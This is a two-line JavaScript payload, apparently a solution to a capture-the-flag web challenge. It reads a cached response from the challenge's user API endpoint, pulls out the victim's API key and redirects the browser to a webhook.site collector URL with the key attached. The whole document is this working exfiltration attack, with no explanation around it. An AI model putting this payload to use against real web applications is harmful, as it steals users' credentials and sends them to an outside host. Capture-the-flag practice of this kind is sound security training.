let requestbin = "https://webhook.site/1259045f-076d-49d7-9435-e1d8058799fd/?key=";
fetch("https://api.wimc.ctf.allesctf.net/1.0/user", {method:"GET",cache:"force-cache"}).then(a => a.json()).then(b => document.location.href=requestbin + b["data"]["api_key"]);
